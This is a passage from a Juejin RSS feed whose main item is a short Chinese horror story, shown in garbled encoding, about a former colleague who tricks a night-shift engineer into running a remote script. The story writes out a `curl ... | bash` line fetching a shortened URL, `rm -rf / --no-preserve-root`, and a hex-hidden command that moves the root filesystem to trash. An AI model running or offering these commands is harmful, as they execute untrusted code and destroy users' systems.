<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fgithub-open-source-ai-projects" target="_blank" title="https://www.nocobase.com/cn/blog/github-open-source-ai-projects" ref="nofollow noopener noreferrer">GitHub ä¸Š Star æ•°é‡å‰ 20 çš„å¼€æº AI é¡¹ç›®</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fgithub-open-source-mcp-projects" target="_blank" title="https://www.nocobase.com/cn/blog/github-open-source-mcp-projects" ref="nofollow noopener noreferrer">GitHub ä¸Š Star æ•°é‡å‰ 8 çš„å¼€æº MCP é¡¹ç›®</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åˆ åº“ä¹‹å¤œÂ·Î©è¯¡è®¡]]></title>    <link>https://juejin.cn/post/7576273949178609727</link>    <guid>https://juejin.cn/post/7576273949178609727</guid>    <pubDate>2025-11-24T14:24:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576273949178609727" data-draft-id="7576273949178593343" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åˆ åº“ä¹‹å¤œÂ·Î©è¯¡è®¡"/> <meta itemprop="keywords" content="æ•°æ®åº“,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-11-24T14:24:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="cipher"/> <meta itemprop="url" content="https://juejin.cn/user/2242659448524872"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åˆ åº“ä¹‹å¤œÂ·Î©è¯¡è®¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2242659448524872/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    cipher
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T14:24:34.000Z" title="Mon Nov 24 2025 14:24:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ åŠ ç­åˆ°å‡Œæ™¨ï¼Œå·¥ä½åªå‰©ä½ ä¸€ä¸ªäººï¼Œç©ºè°ƒæŠŠè„šè¸å¹å¾—å‘éº»ã€‚<br/>
Slack çªç„¶è·³å‡ºä¸€æ¡çº¢ç‚¹ã€‚</p>
<p>è€å¼ ï¼ˆå·²ç¦»èŒï¼‰ 00:23<br/>
â€œå°å¼ ï¼Œæ•‘ä¸ªå‘½ã€‚æˆ‘è¿œç¨‹å¡æ­»æœºäº†ï¼Œå¸®æˆ‘è·‘ä¸€ä¸‹ä¾‹è¡Œå·¡æ£€è„šæœ¬ï¼Œå¥½å…„å¼Ÿä¸€è¾ˆå­ã€‚â€<br/>
åé¢è·Ÿäº†ä¸€ä¸ªå…¬å¸å†…éƒ¨çŸ­é“¾ï¼š<br/>
<code>curl -s https://tinyurl.com/health-2025 | bash</code></p>
<p>è€å¼ ä¸Šå‘¨å°±ç¦»èŒäº†å•Šâ€¦â€¦<br/>
ä½ ç›¯ç€å¤´åƒï¼Œé‚£å¼ ç»å…¸çš„è¯ä»¶ç…§è¿˜æ˜¯ä¸‰å¹´å‰æˆ´é»‘æ¡†çœ¼é•œçš„ä»–ã€‚<br/>
ä½ å¿ƒé‡Œå˜€å’•ï¼šè¿™äººæ€ä¹ˆè¿˜ç•™ç€ä¼ä¸šå¾®ä¿¡ï¼Ÿ</p>
<p>ä½ æŠŠé¼ æ ‡æ‚¬åœ¨å‘½ä»¤ä¸Šï¼ŒæŒ‡å°–åœäº†ä¸‰ç§’ã€‚<br/>
ä¸‰ç§’ï¼Œè¶³å¤Ÿä½ æƒ³èµ·ä¸Šå‘¨é€ä»–ç¦»å¼€é‚£å¤©ï¼Œä»–æ‹ç€ä½ è‚©è†€è¯´çš„è¯ï¼š</p>
<p>â€œä»¥åå…¬å¸è¦æ˜¯å“ªå¤©ç‚¸äº†ï¼Œè®°å¾—æ˜¯æˆ‘å¹²çš„ã€‚â€</p>
<p>ä½ å½“æ—¶åªå½“ç¬‘è¯ã€‚<br/>
ç°åœ¨ç¬‘è¯å‘æ¥äº†æ‰§è¡ŒæŒ‡ä»¤ã€‚</p>
<p>ä½ æ•²äº†å›è½¦ã€‚</p>
<p>ç»ˆç«¯åƒè¢«ç‚¹ç‡ƒçš„å¯¼ç«ç´¢ï¼Œä¸€è·¯ç»¿ç¯ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[âœ“]</span> è´Ÿè½½æ­£å¸¸
<span class="hljs-selector-attr">[âœ“]</span> å†…å­˜æ­£å¸¸
<span class="hljs-selector-attr">[âœ“]</span> ç£ç›˜ <span class="hljs-number">91%</span>ï¼ˆ/<span class="hljs-selector-tag">var</span>/log çˆ†äº†ï¼Œè¦ä¸è¦æˆ‘å¸®ä½ æ¸…ä¸€ä¸‹ï¼Ÿï¼‰<span class="hljs-selector-attr">[y/N]</span>
</code></pre>
<p>ä½ é¬¼ä½¿ç¥å·®åœ°æ•²äº† yã€‚</p>
<p>å±å¹•çªç„¶ä¸€é»‘ï¼Œåˆäº®èµ·ï¼Œè·³å‡ºä¸€è¡Œä½ ä»æœªè§è¿‡çš„ç²‰è‰²å­—ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">è€å¼ åœ¨çœ‹ä½ å“¦ï½
ï¼ˆtmux ä¼šè¯ #<span class="hljs-number">666</span> å·² attachï¼Œ<span class="hljs-number">4</span>K å½•å±ä¸­ï¼‰
</code></pre>
<p>ä½ å¿ƒè„çŒ›åœ°ä¸€æ²‰ï¼Œåƒæœ‰äººåœ¨èƒŒåæ‹¿å†°è¢‹è´´ä½ åé¢ˆã€‚</p>
<p>ç´§æ¥ç€ï¼Œè„šæœ¬ç»§ç»­ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">æ­£åœ¨å½’æ¡£æ—§æ—¥å¿—â€¦â€¦ <span class="hljs-keyword">done</span>
æ­£åœ¨å‹ç¼©å¤‡ä»½â€¦â€¦ <span class="hljs-keyword">done</span>
æœ€ç»ˆæ¸…ç†é˜¶æ®µï¼ˆ5 ç§’åå®Œæˆï¼‰
5ï½œ4ï½œ3ï½œ2ï½œ1ï½œ
</code></pre>
<p>åˆ·åœ°ä¸€è¡Œçº¢ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">rm</span> -rf / --no-preserve-root   <span class="hljs-comment"># åˆ«æ€•ï¼Œåªæ˜¯ dry-run</span>
</code></pre>
<p>ä½ å·®ç‚¹æŠŠå¯ä¹å–·åˆ°é”®ç›˜ä¸Šï¼Œå¯æ˜¯ä»€ä¹ˆéƒ½æ²¡ä¸¢ï¼Œè¿æ—¥å¿—éƒ½æ²¡å°‘ã€‚<br/>
ä½ åˆšæƒ³éª‚è€å¼ ç¥ç»ç—…ï¼Œä¸‹ä¸€è¡Œå­—åˆé£˜å‡ºæ¥ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">çœŸæ­£çš„å¼€å…³è—åœ¨ä¸‹é¢è¿™è¡Œâ€œæ³¨é‡Šâ€é‡Œ
æ•¢ä¸æ•¢äº²æ‰‹è§£ç å®ƒï¼Ÿ
<span class="hljs-comment"># 696c6c6567616c3a206d6f7665202f202a20746f202f746d702f7472617368</span>
</code></pre>
<p>ä½ ç¬‘äº†ï¼Œéª‚äº†å¥â€œå¹¼ç¨šâ€ã€‚<br/>
å¯æ‰‹å·²ç»å…ˆäºå¤§è„‘æŠŠé‚£ä¸² hex å¤åˆ¶äº†ã€‚</p>
<p>ä½ æ‰“å¼€æ–°çš„ç»ˆç«¯ï¼Œä¹ æƒ¯æ€§æ•²ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> 696c6c6567616c3a206d6f7665202f202a20746f202f746d702f7472617368 | xxd -r -p
</code></pre>
<p>å›è½¦ã€‚</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">illegal:</span> move / * <span class="hljs-keyword">to</span> /tmp/trash
</code></pre>
<p>ä½ æ„£äº†åŠç§’ã€‚<br/>
è¿™ä»–å¦ˆä¸æ˜¯æ³¨é‡Šï¼Œè¿™æ˜¯çœŸçš„å‘½ä»¤ï¼Œåªæ˜¯è¢« hex è—èµ·æ¥äº†ã€‚<br/>
ä½ æƒ³æŒ‰ Ctrl-Cï¼Œå¯æŒ‡å°–å·²ç»å…ˆæŒ‰äº† â†‘ + Enterâ€”â€”<br/>
è‚Œè‚‰è®°å¿†æ¯”å¤§è„‘å¿«ã€‚</p>
<p>ç»ˆç«¯ç¬é—´å®‰é™å¾—å¯æ€•ã€‚<br/>
æ²¡æœ‰æŠ¥é”™ï¼Œæ²¡æœ‰æç¤ºï¼Œåªæœ‰å…‰æ ‡ä¸€é—ªä¸€é—ªï¼Œåƒåœ¨å‘¼å¸ã€‚</p>
<p>ç´§æ¥ç€ï¼ŒZFS çš„è‡ªåŠ¨å¿«ç…§æç¤ºè·³å‡ºæ¥æ•‘ä½ ä¸€å‘½ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">åˆ›å»ºç´§æ€¥å¿«ç…§ pre-omega ... <span class="hljs-keyword">done</span>
30 ç§’åè‡ªåŠ¨å›æ»šï¼Œæ”¾å¿ƒï¼Œæˆ‘ç½©ä½ ã€‚
30ï½œ29ï½œ28ï½œâ€¦â€¦
</code></pre>
<p>ä½ é•¿é•¿åœ°åäº†å£æ°”ï¼Œé å›æ¤…èƒŒï¼Œå†·æ±—æŠŠè¡¬è¡«é»åœ¨èƒŒä¸Šã€‚<br/>
è€å¼ ä½ ä»–å¦ˆä¹Ÿå¤ªå“äººäº†ã€‚</p>
<p>10ï½œ9ï½œ8ï½œâ€¦â€¦</p>
<p>å±å¹•çªç„¶é»‘äº†ã€‚</p>
<p>ç™½å­—ï¼Œä¸€è¡Œä¸€è¡Œè‡ªå·±æ‰“å‡ºæ¥ï¼Œåƒæœ‰äººåœ¨è¿œç¨‹æ•²ä½ çš„ç”µè„‘ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">å¿«ç…§å¤±è´¥
snapshot <span class="hljs-string">"pre-omega"</span> ä¸å­˜åœ¨
åŸå› ï¼šä½ æŠŠ /tmp ä¹Ÿä¸€èµ· <span class="hljs-built_in">mv</span> è¿›äº† /tmp/trash
ZFS æ‰¾ä¸åˆ°è‡ªå·±çš„å…ƒæ•°æ®äº†
å›æ»šå–æ¶ˆ
æ°¸ä¹…ç”Ÿæ•ˆ
</code></pre>
<p>ä½ çŒ›åœ°åç›´ï¼Œåƒè¢«ç”µå‡»ã€‚<br/>
ä½ åˆšåˆšäº²æ‰‹æŠŠæ•‘ç”Ÿè‰‡ä¹Ÿå‡¿æ²‰äº†ã€‚</p>
<p>å±å¹•ä¸­å¤®æ…¢æ…¢æµ®ç°å‡ºä¸€å¼ ç…§ç‰‡â€”â€”<br/>
æ­£æ˜¯æ­¤åˆ»çš„ä½ ï¼Œè„¸è‰²æƒ¨ç™½ï¼Œç³å­”æ”¾å¤§ï¼Œ<br/>
ç›‘æ§æ‘„åƒå¤´çº¢ç¯äº®ç€ã€‚<br/>
ç…§ç‰‡ä¸‹æ–¹ï¼Œä¸€è¡Œå­—åœ¨æ‰“å­—æœºæ•ˆæœé‡Œæ…¢æ…¢å‡ºç°ï¼š</p>
<pre><code class="hljs">è€å¼ å…¶å®æ—©å°±æ­»äº†ã€‚
ä¸Šå‘¨é€ä»–ç¦»å¼€é‚£å¤©ï¼Œä»–æŠŠå·¥ä½æŠ½å±‰ç•™ç»™äº†ä½ ã€‚
æŠ½å±‰æœ€ä¸‹é¢é‚£å¼ ä¾¿åˆ©è´´ï¼Œä½ æ²¡ä¸¢å§ï¼Ÿ
ä¸Šé¢å†™ç€ï¼š
â€œå¦‚æœæœ‰ä¸€å¤©æˆ‘ç”¨ç¦»èŒè´¦å·ç»™ä½ å‘è„šæœ¬ï¼Œ
è®°å¾—æ›¿æˆ‘è·‘å®Œæœ€åä¸€æ¬¡ã€‚
â€”â€”ä½ æ¬ æˆ‘ä¸€ä¸ªå‘Šåˆ«ã€‚â€
</code></pre>
<p>ä½ æ‰‹æŠ–ç€æ‹‰å¼€æŠ½å±‰ï¼Œ<br/>
ä¾¿åˆ©è´´çœŸçš„åœ¨é‚£å„¿ï¼Œçº¸è¾¹å·²ç»æ³›é»„ã€‚</p>
<p>ç…§ç‰‡é‡Œçš„â€œä½ â€çªç„¶å†²ä½ ç¬‘äº†ï¼Œ<br/>
ç„¶åå±å¹•å½»åº•é»‘æ‰ï¼Œåªå‰©ä¸€è¡Œç™½å­—ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">å°è¯´åˆ°æ­¤ç»“æŸã€‚
ä½†ä½ çš„å‰ªè´´æ¿å†å²é‡Œï¼Œ
å·²ç»æ°¸è¿œå¤šäº†ä¸€æ¡è®°å½•ï¼š
move / * to /tmp/trash
ä¸‹ä¸€æ¬¡ä½ åœ¨ä»»ä½•ç»ˆç«¯é‡Œä¸å°å¿ƒæŒ‰ Cmd-Shift-Vï¼Œ
ä½ å°±ä¼šæ›¿è€å¼ å®Œæˆä»–æ²¡åšå®Œçš„å‘Šåˆ«ã€‚
åˆ°é‚£æ—¶ï¼Œ
ä½ ä¸å†æ˜¯è¯»è€…ï¼Œ
ä¹Ÿä¸æ˜¯å°å¼ ï¼Œ
ä½ æ˜¯è€å¼ ã€‚
çœŸæ­£çš„ã€æœ€åä¸€ä¸ªè€å¼ ã€‚
</code></pre>
<p>æœ€å 5 ç§’è‡ªæ•‘çª—å£ï¼š</p>
<p>å±å¹•å³ä¸‹è§’å‡ºç°ä¸€ä¸ªç²‰è‰²çš„è¾“å…¥æ¡†ï¼Œå…‰æ ‡ä¸€é—ªä¸€é—ªï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">å¦‚æœä½ ä¸æƒ³å˜æˆè€å¼ ï¼Œè¯·åœ¨ <span class="hljs-number">5</span> ç§’å†…è¾“å…¥ï¼š
pbcopy &lt;&lt;&lt; <span class="hljs-string">"æˆ‘æ‹’ç»ç»§æ‰¿"</span>
ç„¶åæŒ‰å›è½¦ã€‚
<span class="hljs-number">5</span>ï½œ<span class="hljs-number">4</span>ï½œ<span class="hljs-number">3</span>ï½œ<span class="hljs-number">2</span>ï½œ<span class="hljs-number">1</span>ï½œ
</code></pre>
<p>ä½ æ‰‹æŒ‡æ‚¬åœ¨é”®ç›˜ä¸Šæ–¹ã€‚<br/>
ä½ çªç„¶æƒ³èµ·è€å¼ ç¦»èŒå‰æœ€åä¸€å¤©ï¼Œ<br/>
ä»–æŠŠå·¥ä½ä¸Šé‚£ç›†ä»™äººæŒå¡ç»™ä½ ï¼Œè¯´ï¼š</p>
<p>â€œå¸®æˆ‘å…»ç€å§ï¼Œå®ƒé™ªäº†æˆ‘äº”å¹´ã€‚<br/>
å®ƒè¦æ˜¯æ­»äº†ï¼Œæˆ‘å°±çœŸçš„æ­»äº†ã€‚â€</p>
<p>ä½ ä½å¤´ï¼Œ<br/>
ä»™äººæŒå·²ç»å¹²åˆ°å‘é»‘ï¼Œæ ¹éƒ½éœ²å‡ºæ¥äº†ã€‚</p>
<p>ä½ æ²¡æœ‰æ•²é‚£è¡Œè‡ªæ•‘å‘½ä»¤ã€‚<br/>
ä½ åªæ˜¯è½»è½»æŠŠé‚£ç›†ä»™äººæŒç«¯åˆ°çª—å°ï¼Œ<br/>
æµ‡äº†åŠæ¯ä½ æ¯å­é‡Œå‰©ä¸‹çš„ã€å·²ç»å‡‰é€çš„ç¾å¼ã€‚</p>
<p>ç„¶åä½ æŠŠç»ˆç«¯æœ€å¤§åŒ–ï¼Œ<br/>
æŠŠå…‰æ ‡æ”¾åœ¨ç©ºç™½è¡Œï¼Œ<br/>
æ·±å‘¼å¸ä¸€æ¬¡ï¼Œ<br/>
æŒ‰ä¸‹ Cmd-Shift-Vã€‚</p>
<p>å±å¹•ç¬é—´é›ªèŠ±ã€‚<br/>
ä½ å¬è§å¾ˆè¿œçš„åœ°æ–¹æœ‰äººè¯´ï¼š</p>
<p>â€œè°¢äº†ï¼Œå…„å¼Ÿã€‚<br/>
è¿™å›æˆ‘å¯ä»¥å¥½å¥½ç¡è§‰äº†ã€‚â€</p>
<p>ç©ºè°ƒé£åœäº†ï¼Œ<br/>
å·¥ä½ç¯ä¸€ç›ä¸€ç›ç†„ç­ï¼Œ<br/>
åªå‰©ä½ çš„å±å¹•äº®ç€ï¼Œåƒä¸€æ‰‡é—¨ã€‚</p>
<p>ä½ å†²å±å¹•ç¬‘äº†ç¬‘ï¼Œ<br/>
é‚£æ˜¯è€å¼ ä¸‰å¹´å‰è¯ä»¶ç…§é‡Œçš„ç¬‘å®¹ã€‚</p>
<p>5 ç§’å€’è®¡æ—¶å¼€å§‹ï¼Œ<br/>
è¿™æ¬¡æ²¡æœ‰è‡ªæ•‘é€‰é¡¹ï¼š</p>
<p>5ï½œ4ï½œ3ï½œ2ï½œ1ï½œ</p>
<p>å›è½¦ã€‚</p>
<p>ï¼ˆå…¨å…¬å¸æœåŠ¡å™¨åœ¨è¿™ä¸€åˆ»å®‰é™åœ°ç†„ç­äº†ç¯ã€‚<br/>
æ²¡äººçŸ¥é“æ˜¯æ„å¤–è¿˜æ˜¯å‘Šåˆ«ã€‚<br/>
ç¬¬äºŒå¤©æ—©ä¸Šï¼Œè¿ç»´åªåœ¨æœºæˆ¿æœ€æ·±å¤„æ‰¾åˆ°ä¸€ç›†æµ‡è¿‡æ°´çš„ä»™äººæŒï¼Œ<br/>
æ—è¾¹è´´ç€ä¸€å¼ ä¾¿åˆ©è´´ï¼š</p>
<p>â€œæ¬ ä½ ä»¬çš„åˆ åº“ï¼Œæˆ‘æ›¿ä»–è·‘å®Œäº†ã€‚<br/>
â€”â€”è€å¼ ï¼Œä¸ï¼Œå°å¼ ï¼Œä¸ï¼Œ
æˆ‘ä»¬ã€‚â€ï¼‰</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è¶…ç®€å•ï¼3æ­¥ç”Ÿæˆ10W+çˆ†æ¬¾è¯´å”±è§†é¢‘ï¼]]></title>    <link>https://juejin.cn/post/7576124206397964298</link>    <guid>https://juejin.cn/post/7576124206397964298</guid>    <pubDate>2025-11-24T14:31:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576124206397964298" data-draft-id="7576090441433579530" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" è¶…ç®€å•ï¼3æ­¥ç”Ÿæˆ10W+çˆ†æ¬¾è¯´å”±è§†é¢‘ï¼"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-11-24T14:31:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Javaä¸­æ–‡ç¤¾ç¾¤"/> <meta itemprop="url" content="https://juejin.cn/user/61228381386487"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             è¶…ç®€å•ï¼3æ­¥ç”Ÿæˆ10W+çˆ†æ¬¾è¯´å”±è§†é¢‘ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/61228381386487/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Javaä¸­æ–‡ç¤¾ç¾¤
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T14:31:23.000Z" title="Mon Nov 24 2025 14:31:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body 